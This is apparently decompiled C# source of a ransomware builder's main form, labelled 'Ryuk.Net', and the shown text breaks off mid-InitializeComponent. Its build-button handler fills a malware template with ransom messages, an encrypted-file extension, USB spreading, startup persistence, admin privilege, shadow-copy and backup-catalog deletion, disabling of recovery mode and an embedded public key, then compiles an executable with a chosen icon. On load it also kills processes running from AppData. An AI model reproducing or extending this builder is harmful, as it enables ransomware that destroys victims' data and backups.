using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Ryuk.Net;
using Ryuk.Net.Properties;

namespace CustomWindowsForm;

public class BlackForm : Form
{
	private bool isTopPanelDragged = false;

	private bool isLeftPanelDragged = false;

	private bool isRightPanelDragged = false;

	private bool isBottomPanelDragged = false;

	private bool isTopBorderPanelDragged = false;

	private bool isRightBottomPanelDragged = false;

	private bool isLeftBottomPanelDragged = false;

	private bool isRightTopPanelDragged = false;

	private bool isLeftTopPanelDragged = false;

	private bool isWindowMaximized = false;

	private Point offset;

	private Size _normalWindowSize;

	private Point _normalWindowLocation = Point.Empty;

	private string iconLocation = "";

	private IContainer components = null;

	private Panel RightPanel;

	private Panel TopPanel;

	private ButtonZ _CloseButton;

	private Panel RightBottomPanel_1;

	private Label WindowTextLabel;

	private MinMaxButton _MaxButton;

	private Panel panel2;

	private ButtonZ _MinButton;

	private Panel RightBottomPanel_2;

	private Panel LeftBottomPanel_2;

	private Panel RightTopPanel_1;

	private Panel RightTopPanel_2;

	private ShapedButton shapedButton4;

	private CheckBox usbSpreadCheckBox;

	private TextBox textBox1;

	private ShapedButton shapedButton3;

	private SaveFileDialog saveFileDialog1;

	private CheckBox checkBox1;

	private TextBox textBox2;

	private TextBox spreadNameText;

	private CheckBox checkBox2;

	private TextBox textBox4;

	private CheckBox startupcheckBox3;

	private OpenFileDialog openFileDialog1;

	private PictureBox pictureBox1;

	private Label selectIconLabel;

	private CheckBox sleepCheckBox;

	private TextBox SleepTextBox;

	private ShapedButton shapedButton1;

	private TextBox droppedMessageTextbox;

	private Label label1;

	public BlackForm()
	{
		InitializeComponent();
	}

	private void BlackForm_Load(object sender, EventArgs e)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.MainModule!.FileName!.Contains(folderPath))
				{
					process.Kill();
				}
			}
			catch
			{
			}
		}
	}

	private void TopBorderPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		if ((int)e.get_Button() == 1048576)
		{
			isTopBorderPanelDragged = true;
		}
		else
		{
			isTopBorderPanelDragged = false;
		}
	}

	private void TopBorderPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.get_Y() < ((Form)this).get_Location().Y && isTopBorderPanelDragged)
		{
			if (((Control)this).get_Height() < 50)
			{
				((Control)this).set_Height(50);
				isTopBorderPanelDragged = false;
			}
			else
			{
				((Form)this).set_Location(new Point(((Form)this).get_Location().X, ((Form)this).get_Location().Y + e.get_Y()));
				((Control)this).set_Height(((Control)this).get_Height() - e.get_Y());
			}
		}
	}

	private void TopBorderPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isTopBorderPanelDragged = false;
	}

	private void TopPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		if ((int)e.get_Button() == 1048576)
		{
			isTopPanelDragged = true;
			Point point = ((Control)this).PointToScreen(new Point(e.get_X(), e.get_Y()));
			offset = default(Point);
			offset.X = ((Form)this).get_Location().X - point.X;
			offset.Y = ((Form)this).get_Location().Y - point.Y;
		}
		else
		{
			isTopPanelDragged = false;
		}
		if (e.get_Clicks() == 2)
		{
			isTopPanelDragged = false;
			_MaxButton_Click(sender, (EventArgs)(object)e);
		}
	}

	private void TopPanel_MouseMove(object sender, MouseEventArgs e)
	{
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Invalid comparison between Unknown and I4
		if (isTopPanelDragged)
		{
			Point location = ((Control)TopPanel).PointToScreen(new Point(e.get_X(), e.get_Y()));
			location.Offset(offset);
			((Form)this).set_Location(location);
			if ((((Form)this).get_Location().X > 2 || ((Form)this).get_Location().Y > 2) && (int)((Form)this).get_WindowState() == 2)
			{
				((Form)this).set_Location(_normalWindowLocation);
				((Form)this).set_Size(_normalWindowSize);
				_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
				isWindowMaximized = false;
			}
		}
	}

	private void TopPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isTopPanelDragged = false;
		if (((Form)this).get_Location().Y <= 5 && !isWindowMaximized)
		{
			_normalWindowSize = ((Form)this).get_Size();
			_normalWindowLocation = ((Form)this).get_Location();
			Rectangle workingArea = Screen.get_PrimaryScreen().get_WorkingArea();
			((Form)this).set_Location(new Point(0, 0));
			((Form)this).set_Size(new Size(workingArea.Width, workingArea.Height));
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
			isWindowMaximized = true;
		}
	}

	private void LeftPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Invalid comparison between Unknown and I4
		if (((Form)this).get_Location().X <= 0 || e.get_X() < 0)
		{
			isLeftPanelDragged = false;
			((Form)this).set_Location(new Point(10, ((Form)this).get_Location().Y));
		}
		else if ((int)e.get_Button() == 1048576)
		{
			isLeftPanelDragged = true;
		}
		else
		{
			isLeftPanelDragged = false;
		}
	}

	private void LeftPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.get_X() < ((Form)this).get_Location().X && isLeftPanelDragged)
		{
			if (((Control)this).get_Width() < 100)
			{
				((Control)this).set_Width(100);
				isLeftPanelDragged = false;
			}
			else
			{
				((Form)this).set_Location(new Point(((Form)this).get_Location().X + e.get_X(), ((Form)this).get_Location().Y));
				((Control)this).set_Width(((Control)this).get_Width() - e.get_X());
			}
		}
	}

	private void LeftPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftPanelDragged = false;
	}

	private void RightPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		if ((int)e.get_Button() == 1048576)
		{
			isRightPanelDragged = true;
		}
		else
		{
			isRightPanelDragged = false;
		}
	}

	private void RightPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (isRightPanelDragged)
		{
			if (((Control)this).get_Width() < 100)
			{
				((Control)this).set_Width(100);
				isRightPanelDragged = false;
			}
			else
			{
				((Control)this).set_Width(((Control)this).get_Width() + e.get_X());
			}
		}
	}

	private void RightPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isRightPanelDragged = false;
	}

	private void BottomPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		if ((int)e.get_Button() == 1048576)
		{
			isBottomPanelDragged = true;
		}
		else
		{
			isBottomPanelDragged = false;
		}
	}

	private void BottomPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (isBottomPanelDragged)
		{
			if (((Control)this).get_Height() < 50)
			{
				((Control)this).set_Height(50);
				isBottomPanelDragged = false;
			}
			else
			{
				((Control)this).set_Height(((Control)this).get_Height() + e.get_Y());
			}
		}
	}

	private void BottomPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isBottomPanelDragged = false;
	}

	private void _MinButton_Click(object sender, EventArgs e)
	{
		((Form)this).set_WindowState((FormWindowState)1);
	}

	private void _MaxButton_Click(object sender, EventArgs e)
	{
		if (isWindowMaximized)
		{
			((Form)this).set_Location(_normalWindowLocation);
			((Form)this).set_Size(_normalWindowSize);
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
			isWindowMaximized = false;
		}
		else
		{
			_normalWindowSize = ((Form)this).get_Size();
			_normalWindowLocation = ((Form)this).get_Location();
			Rectangle workingArea = Screen.get_PrimaryScreen().get_WorkingArea();
			((Form)this).set_Location(new Point(0, 0));
			((Form)this).set_Size(new Size(workingArea.Width, workingArea.Height));
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
			isWindowMaximized = true;
		}
	}

	private void _CloseButton_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void RightBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isRightBottomPanelDragged = true;
	}

	private void RightBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if (isRightBottomPanelDragged)
		{
			if (((Control)this).get_Width() < 100 || ((Control)this).get_Height() < 50)
			{
				((Control)this).set_Width(100);
				((Control)this).set_Height(50);
				isRightBottomPanelDragged = false;
			}
			else
			{
				((Control)this).set_Width(((Control)this).get_Width() + e.get_X());
				((Control)this).set_Height(((Control)this).get_Height() + e.get_Y());
			}
		}
	}

	private void RightBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isRightBottomPanelDragged = false;
	}

	private void RightBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseDown(sender, e);
	}

	private void RightBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseMove(sender, e);
	}

	private void RightBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseUp(sender, e);
	}

	private void LeftBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isLeftBottomPanelDragged = true;
	}

	private void LeftBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.get_X() < ((Form)this).get_Location().X && (isLeftBottomPanelDragged || ((Control)this).get_Height() < 50))
		{
			if (((Control)this).get_Width() < 100)
			{
				((Control)this).set_Width(100);
				((Control)this).set_Height(50);
				isLeftBottomPanelDragged = false;
			}
			else
			{
				((Form)this).set_Location(new Point(((Form)this).get_Location().X + e.get_X(), ((Form)this).get_Location().Y));
				((Control)this).set_Width(((Control)this).get_Width() - e.get_X());
				((Control)this).set_Height(((Control)this).get_Height() + e.get_Y());
			}
		}
	}

	private void LeftBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftBottomPanelDragged = false;
	}

	private void LeftBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseDown(sender, e);
	}

	private void LeftBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseMove(sender, e);
	}

	private void LeftBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseUp(sender, e);
	}

	private void RightTopPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isRightTopPanelDragged = true;
	}

	private void RightTopPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if ((e.get_Y() < ((Form)this).get_Location().Y || e.get_X() < ((Form)this).get_Location().X) && isRightTopPanelDragged)
		{
			if (((Control)this).get_Height() < 50 || ((Control)this).get_Width() < 100)
			{
				((Control)this).set_Height(50);
				((Control)this).set_Width(100);
				isRightTopPanelDragged = false;
			}
			else
			{
				((Form)this).set_Location(new Point(((Form)this).get_Location().X, ((Form)this).get_Location().Y + e.get_Y()));
				((Control)this).set_Height(((Control)this).get_Height() - e.get_Y());
				((Control)this).set_Width(((Control)this).get_Width() + e.get_X());
			}
		}
	}

	private void RightTopPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isRightTopPanelDragged = false;
	}

	private void RightTopPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseDown(sender, e);
	}

	private void RightTopPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseMove(sender, e);
	}

	private void RightTopPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseUp(sender, e);
	}

	private void LeftTopPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isLeftTopPanelDragged = true;
	}

	private void LeftTopPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if ((e.get_X() < ((Form)this).get_Location().X || e.get_Y() < ((Form)this).get_Location().Y) && isLeftTopPanelDragged)
		{
			if (((Control)this).get_Width() < 100 || ((Control)this).get_Height() < 50)
			{
				((Control)this).set_Width(100);
				((Control)this).set_Height(100);
				isLeftTopPanelDragged = false;
			}
			else
			{
				((Form)this).set_Location(new Point(((Form)this).get_Location().X + e.get_X(), ((Form)this).get_Location().Y));
				((Control)this).set_Width(((Control)this).get_Width() - e.get_X());
				((Form)this).set_Location(new Point(((Form)this).get_Location().X, ((Form)this).get_Location().Y + e.get_Y()));
				((Control)this).set_Height(((Control)this).get_Height() - e.get_Y());
			}
		}
	}

	private void LeftTopPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftTopPanelDragged = false;
	}

	private void LeftTopPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseDown(sender, e);
	}

	private void LeftTopPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseMove(sender, e);
	}

	private void LeftTopPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseUp(sender, e);
	}

	private void file_button_Click(object sender, EventArgs e)
	{
	}

	private void edit_button_Click(object sender, EventArgs e)
	{
	}

	private void view_button_Click(object sender, EventArgs e)
	{
	}

	private void run_button_Click(object sender, EventArgs e)
	{
	}

	private void help_button_Click(object sender, EventArgs e)
	{
	}

	private void WindowTextLabel_MouseDown(object sender, MouseEventArgs e)
	{
		TopPanel_MouseDown(sender, e);
	}

	private void WindowTextLabel_MouseMove(object sender, MouseEventArgs e)
	{
		TopPanel_MouseMove(sender, e);
	}

	private void WindowTextLabel_MouseUp(object sender, MouseEventArgs e)
	{
		TopPanel_MouseUp(sender, e);
	}

	private void shapedButton3_Click(object sender, EventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		Form2 form = new Form2();
		((Form)form).ShowDialog();
	}

	private void shapedButton4_Click(object sender, EventArgs e)
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_0268: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_05dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_060b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0612: Expected O, but got Unknown
		//IL_0622: Unknown result type (might be due to invalid IL or missing references)
		//IL_0628: Invalid comparison between Unknown and I4
		if (((Control)textBox1).get_Text().Trim().Length < 1)
		{
			MessageBox.Show("Please type your message!", "Read_it.txt", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		if (string.IsNullOrWhiteSpace("aa"))
		{
			MessageBox.Show("All fields are required", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < ((TextBoxBase)textBox1).get_Lines().Length; i++)
		{
			stringBuilder.Append("\"" + ((TextBoxBase)textBox1).get_Lines()[i] + "\",\n");
		}
		string source = Resources.Source;
		source = source.Replace("#messages", stringBuilder.ToString());
		if (checkBox1.get_Checked())
		{
			source = source.Replace("#encryptedFileExtension", "");
		}
		else
		{
			string text = ((Control)textBox2).get_Text();
			if (text.Contains("."))
			{
				text = text.Replace(".", "");
			}
			source = source.Replace("#encryptedFileExtension", text);
		}
		if (checkBox2.get_Checked())
		{
			if (((Control)textBox4).get_Text().Trim().Length < 1)
			{
				MessageBox.Show("Proccess name field is empty");
				return;
			}
			if (((Control)textBox4).get_Text().EndsWith(".exe"))
			{
				source = source.Replace("#copyRoaming", "true");
				source = source.Replace("#exeName", ((Control)textBox4).get_Text());
			}
			else
			{
				source = source.Replace("#copyRoaming", "true");
				source = source.Replace("#exeName", ((Control)textBox4).get_Text() + ".exe");
			}
		}
		else
		{
			source = source.Replace("#copyRoaming", "false");
			source = source.Replace("#exeName", ((Control)textBox4).get_Text());
		}
		if (usbSpreadCheckBox.get_Checked())
		{
			if (((Control)spreadNameText).get_Text().Trim().Length < 1)
			{
				MessageBox.Show("Usb spread name field is empty");
				return;
			}
			if (((Control)spreadNameText).get_Text().EndsWith(".exe"))
			{
				source = source.Replace("#checkSpread", "true");
				source = source.Replace("#spreadName", ((Control)spreadNameText).get_Text());
			}
			else
			{
				source = source.Replace("#checkSpread", "true");
				source = source.Replace("#spreadName", ((Control)spreadNameText).get_Text() + ".exe");
			}
		}
		else
		{
			source = source.Replace("#checkSpread", "false");
			source = source.Replace("#spreadName", ((Control)spreadNameText).get_Text());
		}
		source = ((!startupcheckBox3.get_Checked()) ? source.Replace("#startupFolder", "true") : source.Replace("#startupFolder", "true"));
		if (sleepCheckBox.get_Checked())
		{
			source = source.Replace("#checkSleep", "true");
			source = source.Replace("#sleepTextbox", ((Control)SleepTextBox).get_Text());
		}
		else
		{
			source = source.Replace("#checkSleep", "false");
			source = source.Replace("#sleepTextbox", ((Control)SleepTextBox).get_Text());
		}
		source = ((!Settings.Default.checkAdminPrivilage) ? source.Replace("#adminPrivilage", "false") : source.Replace("#adminPrivilage", "true"));
		source = ((!Settings.Default.deleteBackupCatalog) ? source.Replace("#checkdeleteBackupCatalog", "false") : source.Replace("#checkdeleteBackupCatalog", "true"));
		source = ((!Settings.Default.deleteShadowCopies) ? source.Replace("#checkdeleteShadowCopies", "false") : source.Replace("#checkdeleteShadowCopies", "true"));
		source = ((!Settings.Default.disableRecoveryMode) ? source.Replace("#checkdisableRecoveryMode", "false") : source.Replace("#checkdisableRecoveryMode", "true"));
		if (((Control)droppedMessageTextbox).get_Text().Trim().Length < 1)
		{
			MessageBox.Show("Dropped message name field is empty");
			return;
		}
		source = source.Replace("#droppedMessageTextbox", ((Control)droppedMessageTextbox).get_Text());
		string publicKey = Settings.Default.publicKey;
		if (Settings.Default.encryptOption)
		{
			if (!(publicKey != ""))
			{
				MessageBox.Show("Decrypter name field is empty. Go to advanced option and create or select decrypter", "Advanced Option");
				return;
			}
			using StringReader stringReader = new StringReader(publicKey);
			StringBuilder stringBuilder2 = new StringBuilder();
			string text2;
			while ((text2 = stringReader.ReadLine()) != null)
			{
				string text3 = text2.Replace("\"", "\\\"");
				stringBuilder2.AppendLine("pubclicKey.AppendLine(\"" + text3 + "\");");
			}
			source = source.Replace("#encryptOption", "true");
			source = source.Replace("#publicKey", stringBuilder2.ToString());
		}
		else
		{
			source = source.Replace("#encryptOption", "false");
			source = source.Replace("#publicKey", "");
		}
		SaveFileDialog val = new SaveFileDialog();
		try
		{
			((FileDialog)val).set_Filter("Executable (*.exe)|*.exe");
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				new Compiler(source, ((FileDialog)val).get_FileName(), iconLocation);
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
	{
	}

	private void panel2_Paint(object sender, PaintEventArgs e)
	{
	}

	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)textBox2).get_Enabled())
		{
			((Control)textBox2).set_Enabled(true);
		}
		else
		{
			((Control)textBox2).set_Enabled(false);
		}
	}

	private void usbSpreadCheckBox_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)spreadNameText).get_Enabled())
		{
			((Control)spreadNameText).set_Enabled(true);
		}
		else
		{
			((Control)spreadNameText).set_Enabled(false);
		}
	}

	private void checkBox2_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)textBox4).get_Enabled())
		{
			((Control)textBox4).set_Enabled(true);
		}
		else
		{
			((Control)textBox4).set_Enabled(false);
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Invalid comparison between Unknown and I4
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		try
		{
			((FileDialog)val).set_Filter("Icons (*.ico)|*.ico");
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				iconLocation = ((FileDialog)val).get_FileName();
				pictureBox1.set_Image((Image)(object)Bitmap.FromHicon(new Icon(((FileDialog)val).get_FileName(), new Size(60, 60)).get_Handle()));
				((Control)selectIconLabel).set_Text("");
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void selectIconLabel_Click(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Invalid comparison between Unknown and I4
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		try
		{
			((FileDialog)val).set_Filter("Icons (*.ico)|*.ico");
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				iconLocation = ((FileDialog)val).get_FileName();
				pictureBox1.set_Image((Image)(object)Bitmap.FromHicon(new Icon(((FileDialog)val).get_FileName(), new Size(60, 60)).get_Handle()));
				((Control)selectIconLabel).set_Text("");
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void checkBox3_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)SleepTextBox).get_Enabled())
		{
			((Control)SleepTextBox).set_Enabled(true);
		}
		else
		{
			((Control)SleepTextBox).set_Enabled(false);
		}
	}

	private void SleepTextBox_KeyPress_1(object sender, KeyPressEventArgs e)
	{
		if (!char.IsControl(e.get_KeyChar()) && !char.IsDigit(e.get_KeyChar()))
		{
			e.set_Handled(true);
		}
	}

	private void shapedButton1_Click(object sender, EventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		advancedSettingForm advancedSettingForm = new advancedSettingForm();
		((Form)advancedSettingForm).ShowDialog();
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void textBox1_MouseClick(object sender, MouseEventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Expected O, but got Unknown
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected O, but got Unknown
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Expected O, but got Unknown
		//IL_021b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0225: Expected O, but got Unknown
		//IL_0233: Unknown result type (might be due to invalid IL or missing references)
		//IL_023d: Expected O, but got Unknown
		//IL_024b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0255: Expected O, but got Unknown
		//IL_032d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0337: Expected O, but got Unknown
		//IL_0345: Unknown result type (might be due to invalid IL or missing references)
		//IL_034f: Expected O, but got Unknown
		//IL_035d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0367: Expected O, but got Unknown
		//IL_03be: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c8: Expected O, but got Unknown
		//IL_05f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_05fc: Expected O, but got Unknown
		//IL_0676: Unknown result type (might be due to invalid IL or missing references)
		//IL_0680: Expected O, but got Unknown
		//IL_068e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0698: Expected O, but got Unknown
		//IL_06a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_06b0: Expected O, but got Unknown
		//IL_0707: Unknown result type (might be due to invalid IL or missing references)
		//IL_0711: Expected O, but got Unknown
		//IL_0878: Unknown result type (might be due to invalid IL or missing references)
		//IL_0882: Expected O, but got Unknown
		//IL_0890: Unknown result type (might be due to invalid IL or missing references)
		//IL_089a: Expected O, but got Unknown
		//IL_08a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_08b2: Expected O, but got Unknown
		//IL_0ab5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0abf: Expected O, but got Unknown
		//IL_0aee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af8: Expected O, but got Unknown
		//IL_0b8e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b98: Expected O, but got Unknown
		//IL_0ce9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cf3: Expected O, but got Unknown
		//IL_0f2c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f36: Expected O, but got Unknown
		//IL_0fbf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fc9: Expected O, but got Unknown
		//IL_11ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_11f6: Expected O, but got Unknown
		//IL_12ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_12d8: Expected O, but got Unknown
		//IL_1385: Unknown result type (might be due to invalid IL or missing references)
		//IL_138f: Expected O, but got Unknown
		//IL_14ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_1509: Expected O, but got Unknown
		//IL_15d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_15dc: Expected O, but got Unknown
		//IL_1740: Unknown result type (might be due to invalid IL or missing references)
		//IL_174a: Expected O, but got Unknown
		//IL_1970: Unknown result type (might be due to invalid IL or missing references)
		//IL_197a: Expected O, but got Unknown
		//IL_1b4a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b54: Expected O, but got Unknown
		//IL_1b62: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b6c: Expected O, but got Unknown
		//IL_1b7a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b84: Expected O, but got Unknown
		//IL_1c0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c15: Expected O, but got Unknown
		//IL_1c23: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c2d: Expected O, but got Unknown
		//IL_1c3b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c45: Expected O, but got Unknown
		//IL_1ccd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cd7: Expected O, but got Unknown
		//IL_1ce5: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cef: Expected O, but got Unknown
		//IL_1cfd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d07: Expected O, but got Unknown
		//IL_1d8f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d99: Expected O, but got Unknown
		//IL_1da7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1db1: Expected O, but got Unknown
		//IL_1dbf: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dc9: Expected O, but got Unknown
		//IL_1e0f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e19: Expected O, but got Unknown
		//IL_1eb8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ec2: Expected O, but got Unknown
		//IL_2008: Unknown result type (might be due to invalid IL or missing references)
		//IL_2012: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(BlackForm));
		RightPanel = new Panel();
		TopPanel = new Panel();
		_MinButton = new ButtonZ();
		_MaxButton = new MinMaxButton();
		WindowTextLabel = new Label();
		_CloseButton = new ButtonZ();
		RightBottomPanel_1 = new Panel();
		panel2 = new Panel();
		label1 = new Label();
		droppedMessageTextbox = new TextBox();
		shapedButton1 = new ShapedButton();
		sleepCheckBox = new CheckBox();
		SleepTextBox = new TextBox();
		selectIconLabel = new Label();
		pictureBox1 = new PictureBox();
		startupcheckBox3 = new CheckBox();
		textBox4 = new TextBox();
